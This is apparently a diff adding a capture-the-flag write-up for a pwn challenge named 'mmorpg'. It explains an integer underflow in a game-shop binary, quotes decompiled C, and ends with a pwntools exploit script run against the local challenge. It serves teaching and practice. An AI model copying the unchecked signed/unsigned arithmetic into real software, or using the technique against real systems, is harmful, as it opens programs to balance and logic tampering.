@@ -1,0 +1,118 @@
+---
+title: 'mmorpg'
+description: 'An integer underflow vulnerability in an RPG game simulation.'
+date: 2026-01-12
+tags: ['integer-overflow']
+authors: ['w6rst']
+order: 1
+---
+
+import { Code } from 'astro-expressive-code/components'
+import Challenge from '@/components/mdx/Challenge.astro'
+import pwn2_checksec from './assets/pwn2_checksec.txt?raw'
+import pwn2_src from './assets/pwn2_src.txt?raw'
+
+## mmorpg
+
+<Challenge
+  category="pwn"
+  files={['mmorpg']}
+  description="I love mmorpg!!"
+/>
+
+Inspecting the binary with `checksec`:
+
+<Code code={pwn2_checksec} lang="ansi" />
+
+The binary is a **64-bit ELF** with all protections enabled (**Full RELRO**, **Canary**, **NX**, **PIE**).
+
+## Program Analysis
+
+The program is a simple RPG shop simulation. We start with **1000 coins** and can buy equipment or donate to a guild. To get the flag, we need to purchase all five legendary items, but their total cost far exceeds our initial balance.
+
+Looking at the decompiled source:
+
+<Code code={pwn2_src} lang="c" />
+
+The vulnerability is in the "Donate to guild" section of `main(){:c}`:
+
+```c
+    else if (local_124 == 3) {
+      printf("How much do you want to donate?\n> ");
+      __isoc99_scanf("%d", &local_128); // local_128 is a signed int
+      iVar1 = local_128;
+      if (local_128 < 0) {
+        iVar1 = 0;
+      }
+      local_12c = local_12c - iVar1; // local_12c is an unsigned int
+    }
+```
+
+The variable `local_12c` (our coins) is a `uint` (32-bit unsigned), but the donation amount `iVar1` is a signed `int`. While there's a check to prevent negative donations, there's no check to see if we're donating more than we actually have.
+
+If we donate **1001 coins**, `local_12c` will underflow:
+`1000 - 1001 = 0xffffffff` (4,294,967,295)
+
+
+However, simply having `0xffffffff` coins isn't enough. In `purchase_equipment(){:c}`, the check for whether we can afford an item treats our balance as a **signed integer**:
+
+```c
+    case 1:
+    local_14 = 400446;
+    if (400445 < *param_1) { // *param_1 is int*
+      shadow = 1;
+      *param_1 = *param_1 + -400446;
+    }
+    break;
+```
+
+In a signed 32-bit integer context, `0xffffffff` is actually **-1**. Since `-1` is not greater than `400445`, the purchase fails.
+
+## Exploitation
+
+To bypass this, we need to underflow the balance even further until it wraps back into the **positive signed range** (0 to 2,147,483,647).
+
+We can achieve this by donating large amounts multiple times:
+
+1.  **Start**: 1000 (`0x000003e8`)
+2.  **Donate 1001**: `0xffffffff` (Signed: -1)
+3.  **Donate 2147483647** (`0x7fffffff`): `0xffffffff - 0x7fffffff = 0x80000000` (Signed: -2147483648)
+4.  **Donate 1**: `0x80000000 - 1 = 0x7fffffff` (Signed: 2147483647)
+
+Now our balance is `0x7fffffff`, which is the maximum possible positive signed 32-bit integer. This is more than enough to buy every item in the shop.
+
+### Exploit Script
+
+```python
+from pwn import *
+
+exe = './mmorpg'
+elf = context.binary = ELF(exe, checksec=False)
+
+io = process(exe)
+
+def menu(choice):
+    io.sendlineafter(b'> ', str(choice).encode())
+
+def buy(item):
+    menu(1)
+    io.sendlineafter(b'buy : ', str(item).encode())
+
+def donate(amount):
+    menu(3)
+    io.sendlineafter(b'> ', str(amount).encode())
+
+# 1. Underflow coins into positive signed range
+donate(1001)       # 0xffffffff (-1)
+donate(2147483647) # 0x80000000 (-2147483648)
+donate(1)          # 0x7fffffff (2147483647)
+
+# 2. Buy everything
+for i in range(1,6):
+    buy(i)
+
+# 3. Complete purchase to get flag
+menu(2)
+
+io.interactive()
+```
